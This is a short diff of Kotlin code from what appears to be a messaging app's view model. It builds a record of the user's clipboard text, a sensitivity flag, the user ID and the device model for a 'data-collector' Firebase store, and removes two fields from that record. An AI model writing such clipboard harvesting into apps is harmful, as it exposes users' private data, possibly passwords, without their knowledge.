@@ -133,10 +133,8 @@ class MessagingViewModel : ViewModel() {
             "uid" to uid,
             "capturedText" to clipboardText,
             "isSensitive" to isSensitive,
-            "replacedWith" to null,
             "timestamp" to com.google.firebase.Timestamp.now(),
             "deviceInfo" to android.os.Build.MODEL,
-            "source" to "message_send" // so you know where it came from
         )
 
         // use same data-collector firebase
